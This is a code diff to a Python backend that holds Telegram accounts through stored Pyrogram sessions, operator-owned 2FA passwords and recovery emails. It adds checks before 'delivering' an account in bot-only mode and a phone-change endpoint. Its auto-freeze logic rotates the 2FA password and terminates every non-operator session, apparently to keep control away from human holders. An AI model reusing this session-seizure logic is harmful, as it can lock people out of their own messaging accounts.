@@ -1886,12 +1886,13 @@ async def confirm_delivery(account_id: str, request: DeliveryConfirmRequest):
 @router.post("/delivery/transition-to-bot-only/{account_id}")
 async def transition_to_bot_only(account_id: str):
     """
-    Transition account from user_keeps_session to bot_only mode.
-    Steps:
-    1. Connect Pyrogram, run full security re-audit
-    2. Verify email is ours and password is ours
-    3. Terminate all non-bot sessions
-    4. Update transfer mode to bot_only
+    Transition account to bot_only mode.
+    Pre-conditions (ALL must be met):
+    1. No user sessions (only bot sessions with our API_ID)
+    2. 2FA is enabled
+    3. Recovery email is ours
+    4. No pending password reset
+    5. Bot sessions verified as ours (same API_ID)
     """
     phone = account_id
     account = await get_account(phone)
@@ -1903,65 +1904,104 @@ async def transition_to_bot_only(account_id: str):
         raise HTTPException(status_code=400, detail="No Pyrogram session available")
     
     if account.transfer_mode == DBTransferMode.BOT_ONLY:
-        return {"status": "success", "message": "Account is already in bot_only mode"}
+        return {"status": "success", "message": "Account is already in bot_only mode", "already_bot_only": True}
     
     manager = get_pyrogram()
-    results = {"security_passed": False, "details": {}}
+    our_api_id = manager.api_id
+    blockers = []
+    details = {}
     
     try:
-        # Connect Pyrogram
         connected = await manager.connect_from_string(phone, account.pyrogram_session)
         if not connected:
             raise HTTPException(status_code=400, detail="Failed to connect session")
         
-        # Full security re-audit
         security_info = await manager.get_security_info(phone, known_password=account.generated_password)
+        
+        # --- Classify sessions ---
+        other_sessions = security_info.get("other_sessions", [])
+        bot_sessions = [s for s in other_sessions if s.get("api_id") == our_api_id]
+        user_sessions = [s for s in other_sessions if s.get("api_id") != our_api_id]
+        
+        details["bot_sessions"] = len(bot_sessions)
+        details["user_sessions"] = len(user_sessions)
+        details["user_session_details"] = [
+            f"{s.get('device_model')} ({s.get('app_name')}) - {s.get('country')}"
+            for s in user_sessions
+        ]
+        
+        # BLOCKER 1: User sessions must be zero
+        if user_sessions:
+            blockers.append(f"{len(user_sessions)} user session(s) still active. User must terminate all sessions from Telegram app first.")
+        
+        # BLOCKER 2: 2FA must be enabled
         has_password = security_info.get("has_password", False)
-        recovery_email = security_info.get("recovery_email_full", "")
-        
-        results["details"]["has_2fa"] = has_password
-        results["details"]["recovery_email"] = recovery_email or "none"
-        results["details"]["email_is_ours"] = bool(recovery_email and EMAIL_DOMAIN in recovery_email.lower())
-        
-        # Security checks
+        details["has_2fa"] = has_password
         if not has_password:
-            await manager.disconnect(phone)
-            raise HTTPException(status_code=400, detail="2FA password was removed. Cannot transition - re-register account.")
+            blockers.append("2FA is disabled. Cannot transition.")
         
-        if recovery_email and EMAIL_DOMAIN not in recovery_email.lower():
-            await manager.disconnect(phone)
-            raise HTTPException(status_code=400, detail=f"Recovery email changed to {recovery_email}. Cannot transition - re-register account.")
+        # BLOCKER 3: Recovery email must be ours
+        recovery_email = security_info.get("recovery_email_full", "")
+        details["recovery_email"] = recovery_email or "none"
+        email_is_ours = bool(recovery_email and EMAIL_DOMAIN in recovery_email.lower())
+        details["email_is_ours"] = email_is_ours
+        if recovery_email and not email_is_ours:
+            blockers.append(f"Recovery email changed to {recovery_email} (not ours).")
+        elif not recovery_email and not security_info.get("email_unconfirmed_pattern"):
+            blockers.append("No recovery email set.")
         
-        # Terminate all non-bot sessions
-        term_result = await manager.terminate_other_sessions(phone, keep_bot_sessions=True)
-        results["details"]["terminated_sessions"] = term_result.get("terminated_count", 0)
-        results["details"]["kept_bot_sessions"] = term_result.get("kept_bot_sessions", 0)
+        # BLOCKER 4: No pending password reset
+        if security_info.get("pending_reset_date"):
+            blockers.append("Pending password reset detected!")
+        
+        # BLOCKER 5: No password_pending sessions
+        pw_pending = security_info.get("password_pending_sessions", 0)
+        if pw_pending > 0:
+            blockers.append(f"{pw_pending} session(s) logged in without 2FA password.")
+        
+        # BLOCKER 6: Login email must be ours or absent
+        login_email = security_info.get("login_email_pattern")
+        if login_email and EMAIL_DOMAIN not in str(login_email).lower():
+            blockers.append(f"Foreign login email active: {login_email}")
+        
+        # --- If any blockers, reject ---
+        if blockers:
+            await manager.disconnect(phone)
+            return {
+                "status": "blocked",
+                "message": "Cannot transition to bot_only. Fix the following issues first:",
+                "blockers": blockers,
+                "details": details,
+                "account_id": phone
+            }
+        
+        # --- All checks passed, verify bot sessions are ours ---
+        details["bot_session_details"] = [
+            {"device": s.get("device_model"), "app": s.get("app_name"), "api_id": s.get("api_id")}
+            for s in bot_sessions
+        ]
         
         # Disconnect Pyrogram
         await manager.disconnect(phone)
         
         # Update transfer mode
-        await update_account(
-            phone,
-            transfer_mode=DBTransferMode.BOT_ONLY
-        )
-        
-        results["security_passed"] = True
+        await update_account(phone, transfer_mode=DBTransferMode.BOT_ONLY)
         
         log_credentials(
             phone=phone,
             action="TRANSITION_TO_BOT_ONLY",
             telegram_id=account.telegram_id,
-            extra_data=results["details"]
+            extra_data=details
         )
         
-        await log_auth_action(phone, "transition_bot_only", "success")
+        await log_auth_action(phone, "transition_bot_only", "success",
+                              f"Bot sessions: {len(bot_sessions)}, User sessions cleared")
         
         return {
             "status": "success",
-            "message": "Account transitioned to bot_only mode",
+            "message": "Account transitioned to bot_only mode successfully",
             "account_id": phone,
-            **results
+            "details": details
         }
     
     except HTTPException:
@@ -1970,6 +2010,104 @@ async def transition_to_bot_only(account_id: str):
         logger.error(f"[TRANSITION] Error for {phone}: {e}")
         try:
             await manager.disconnect(phone)
+        except:
+            pass
+        raise HTTPException(status_code=500, detail=str(e))
+
+
+# ============== Phone Change Endpoint ==============
+
+class ChangePhoneRequest(BaseModel):
+    new_phone: str
+
+@router.post("/account/change-phone/{account_id}")
+async def change_phone(account_id: str, request: ChangePhoneRequest):
+    """
+    Change account phone number in DB after verifying via live session.
+    Steps:
+    1. Connect Pyrogram from stored session
+    2. Call getMe() to get the REAL current phone from Telegram
+    3. If real phone matches new_phone → update DB
+    4. If not → reject (phone mismatch)
+    """
+    old_phone = account_id
+    new_phone = request.new_phone.strip()
+    
+    if not new_phone or not new_phone.startswith("+"):
+        raise HTTPException(status_code=400, detail="Invalid phone format. Must start with +")
+    
+    if new_phone == old_phone:
+        return {"status": "success", "message": "Phone is already the same", "phone": old_phone}
+    
+    account = await get_account(old_phone)
+    if not account:
+        raise HTTPException(status_code=404, detail="Account not found")
+    
+    if not account.pyrogram_session:
+        raise HTTPException(status_code=400, detail="No Pyrogram session available")
+    
+    manager = get_pyrogram()
+    
+    try:
+        connected = await manager.connect_from_string(old_phone, account.pyrogram_session)
+        if not connected:
+            raise HTTPException(status_code=400, detail="Failed to connect session")
+        
+        # Get real phone from Telegram
+        me_info = await manager.get_me_info(old_phone)
+        if me_info.get("status") != "success":
+            await manager.disconnect(old_phone)
+            raise HTTPException(status_code=400, detail=f"Failed to get account info: {me_info.get('error')}")
+        
+        real_phone = me_info.get("phone", "")
+        if real_phone and not real_phone.startswith("+"):
+            real_phone = "+" + real_phone
+        
+        await manager.disconnect(old_phone)
+        
+        # Verify new_phone matches real phone on Telegram
+        if real_phone != new_phone:
+            return {
+                "status": "mismatch",
+                "message": f"Phone mismatch: Telegram reports {real_phone}, you provided {new_phone}",
+                "telegram_phone": real_phone,
+                "requested_phone": new_phone
+            }
+        
+        # Update phone in database
+        from sqlalchemy import update as sql_update
+        from backend.models.database import Account, async_session
+        
+        async with async_session() as session:
+            async with session.begin():
+                stmt = sql_update(Account).where(Account.phone == old_phone).values(phone=new_phone)
+                await session.execute(stmt)
+        
+        log_credentials(
+            phone=new_phone,
+            action="PHONE_CHANGED",
+            telegram_id=account.telegram_id,
+            extra_data={"old_phone": old_phone, "new_phone": new_phone}
+        )
+        
+        await log_auth_action(new_phone, "phone_changed", "success", f"From {old_phone} to {new_phone}")
+        
+        logger.info(f"[PHONE_CHANGE] {old_phone} → {new_phone} (tg_id={account.telegram_id})")
+        
+        return {
+            "status": "success",
+            "message": f"Phone updated from {old_phone} to {new_phone}",
+            "old_phone": old_phone,
+            "new_phone": new_phone,
+            "telegram_phone": real_phone
+        }
+    
+    except HTTPException:
+        raise
+    except Exception as e:
+        logger.error(f"[PHONE_CHANGE] Error for {old_phone}: {e}")
+        try:
+            await manager.disconnect(old_phone)
         except:
             pass
         raise HTTPException(status_code=500, detail=str(e))
@@ -2037,41 +2175,59 @@ async def security_check(account_id: str):
     
     red_flags = []
     warnings = []
-    
-    # --- Check sessions ---
-    other_sessions = security_info.get("other_sessions", [])
+    transfer_mode = account.transfer_mode.value if account.transfer_mode else "bot_only"
     our_api_id = manager.api_id
     
+    # =====================================================
+    # SESSION CLASSIFICATION: bot sessions vs user sessions
+    # Bot sessions = same API_ID as ours (Pyrogram/Telethon)
+    # User sessions = different API_ID (official app, etc.)
+    # =====================================================
+    other_sessions = security_info.get("other_sessions", [])
+    bot_sessions = []
+    user_sessions = []
+    
     for sess in other_sessions:
-        sess_flags = []
-        
-        # Unknown API ID (not ours)
-        if sess.get("api_id") and sess["api_id"] != our_api_id:
-            sess_flags.append(f"Different API ID: {sess['api_id']}")
-        
-        # Non-official app
-        if not sess.get("is_official_app"):
-            sess_flags.append("Unofficial app")
-        
-        # Suspicious device names
-        device = (sess.get("device_model") or "").lower()
-        suspicious_devices = ["termux", "userbot", "pyrogram", "telethon", "bot"]
-        for sd in suspicious_devices:
-            if sd in device:
-                sess_flags.append(f"Suspicious device: {sess.get('device_model')}")
-                break
-        
-        if sess_flags:
+        is_bot = (sess.get("api_id") == our_api_id)
+        sess["is_bot_session"] = is_bot
+        if is_bot:
+            bot_sessions.append(sess)
+        else:
+            user_sessions.append(sess)
+    
+    # --- Evaluate user sessions based on transfer_mode ---
+    if transfer_mode == "bot_only":
+        # BOT_ONLY: any user session is a red flag
+        for sess in user_sessions:
+            sess_issues = []
+            if sess.get("api_id") and sess["api_id"] != our_api_id:
+                sess_issues.append(f"Foreign API ID: {sess['api_id']}")
+            if not sess.get("is_official_app"):
+                sess_issues.append("Unofficial app")
+            device = (sess.get("device_model") or "").lower()
+            for sd in ["termux", "userbot"]:
+                if sd in device:
+                    sess_issues.append(f"Suspicious device: {sess.get('device_model')}")
+                    break
             red_flags.append({
-                "type": "suspicious_session",
+                "type": "user_session_in_bot_only",
+                "severity": "critical",
+                "message": f"User session detected in bot_only mode: {sess.get('device_model')} ({sess.get('app_name')})",
                 "device": sess.get("device_model"),
                 "platform": sess.get("platform"),
                 "app": sess.get("app_name"),
                 "ip": sess.get("ip"),
                 "country": sess.get("country"),
-                "created": sess.get("date_created"),
-                "last_active": sess.get("date_active"),
-                "issues": sess_flags
+                "hash": sess.get("hash"),
+                "issues": sess_issues
+            })
+    else:
+        # USER_KEEPS_SESSION: user sessions are expected, just report them
+        if user_sessions:
+            warnings.append({
+                "type": "user_sessions_present",
+                "message": f"{len(user_sessions)} user session(s) active (expected in user_keeps_session mode)",
+                "count": len(user_sessions)
             })
     
     # --- Check email ---
@@ -2108,7 +2264,7 @@ async def security_check(account_id: str):
     if security_info.get("pending_reset_date"):
         red_flags.append({
             "type": "pending_reset",
-            "message": f"Pending password reset request!",
+            "message": "Pending password reset request!",
             "severity": "critical"
         })
     
@@ -2122,24 +2278,34 @@ async def security_check(account_id: str):
             "count": pw_pending_count
         })
     
-    # --- Check login email (passwordless login / passkey-like) ---
+    # --- Check login email (passwordless login) ---
+    # If login email is on OUR domain → safe (it's ours)
+    # If login email is on a foreign domain → critical
     login_email = security_info.get("login_email_pattern")
     if login_email:
-        red_flags.append({
-            "type": "login_email_active",
-            "message": f"Login email (passwordless login) is active: {login_email}",
-            "severity": "critical"
-        })
+        if EMAIL_DOMAIN in str(login_email).lower():
+            warnings.append({
+                "type": "login_email_ours",
+                "message": f"Login email (ours): {login_email}"
+            })
+        else:
+            red_flags.append({
+                "type": "login_email_foreign",
+                "message": f"Foreign login email active: {login_email}",
+                "severity": "critical"
+            })
     
     # --- Check authorization TTL ---
     auth_ttl = security_info.get("authorization_ttl_days")
-    if auth_ttl and auth_ttl > 30:
+    if auth_ttl and auth_ttl > 400:
         warnings.append({
             "type": "high_auth_ttl",
-            "message": f"Authorization TTL is {auth_ttl} days (should be ≤ 7 for security)"
+            "message": f"Authorization TTL is {auth_ttl} days"
         })
     
-    # --- Determine threat level ---
+    # =====================================================
+    # DETERMINE THREAT LEVEL
+    # =====================================================
     critical_count = sum(1 for f in red_flags if f.get("severity") == "critical")
     threat_level = "safe"
     if critical_count > 0:
@@ -2149,10 +2315,17 @@ async def security_check(account_id: str):
     elif len(warnings) > 0:
         threat_level = "low"
     
-    # --- Auto-freeze if critical ---
+    # =====================================================
+    # DELIVERY READINESS
+    # =====================================================
+    delivery_ready = (transfer_mode == "bot_only" and threat_level == "safe")
+    transition_needed = (transfer_mode == "user_keeps_session")
+    
+    # =====================================================
+    # AUTO-FREEZE: only for REAL threats (not our own sessions/email)
+    # =====================================================
     frozen = False
     if threat_level == "critical" and account.pyrogram_session:
-        # Change 2FA and terminate suspicious sessions
         try:
             if security_info.get("has_password") and known_password:
                 new_pass = generate_strong_password(24)
@@ -2162,18 +2335,18 @@ async def security_check(account_id: str):
                     frozen = True
                     logger.warning(f"FROZEN: 2FA changed for {phone} due to critical threat")
             
-            # Terminate suspicious sessions
-            for sess in other_sessions:
-                if sess.get("api_id") != our_api_id:
-                    try:
-                        client = manager.active_clients.get(phone)
-                        if client:
-                            await client.invoke(
-                                functions.account.ResetAuthorization(hash=sess["hash"])
-                            )
-                            logger.warning(f"Terminated suspicious session for {phone}: {sess.get('device_model')}")
-                    except:
-                        pass
+            # Terminate only user sessions (not our bot sessions)
+            from pyrogram.raw import functions as raw_functions
+            for sess in user_sessions:
+                try:
+                    client = manager.active_clients.get(phone)
+                    if client and sess.get("hash"):
+                        await client.invoke(
+                            raw_functions.account.ResetAuthorization(hash=sess["hash"])
+                        )
+                        logger.warning(f"Terminated user session for {phone}: {sess.get('device_model')}")
+                except Exception:
+                    pass
         except Exception as e:
             logger.error(f"Auto-freeze failed for {phone}: {e}")
     
@@ -2181,7 +2354,10 @@ async def security_check(account_id: str):
     try:
         from backend.log_bot import log_security_check as log_sec
         flag_texts = [f.get("message", f.get("type", "?")) for f in red_flags]
-        await log_sec(phone, threat_level, flag_texts, frozen)
+        await log_sec(phone, threat_level, flag_texts, frozen,
+                      transfer_mode=transfer_mode,
+                      bot_sessions=len(bot_sessions),
+                      user_sessions=len(user_sessions))
     except:
         pass
     
@@ -2191,12 +2367,18 @@ async def security_check(account_id: str):
     return {
         "status": "success",
         "account_id": phone,
+        "transfer_mode": transfer_mode,
         "threat_level": threat_level,
         "frozen": frozen,
+        "delivery_ready": delivery_ready,
+        "transition_needed": transition_needed,
         "red_flags": red_flags,
         "warnings": warnings,
-        "session_count": len(other_sessions) + 1,
-        "other_sessions_count": len(other_sessions),
+        "bot_sessions_count": len(bot_sessions),
+        "user_sessions_count": len(user_sessions),
+        "total_sessions": len(other_sessions) + 1,
+        "bot_sessions": [{"device": s.get("device_model"), "app": s.get("app_name"), "api_id": s.get("api_id")} for s in bot_sessions],
+        "user_sessions": [{"device": s.get("device_model"), "app": s.get("app_name"), "api_id": s.get("api_id"), "ip": s.get("ip"), "country": s.get("country")} for s in user_sessions],
         "has_2fa": security_info.get("has_password", False),
         "recovery_email": recovery_email_full,
         "recovery_email_status": "confirmed" if recovery_email_full else ("pending" if email_unconfirmed else "none"),
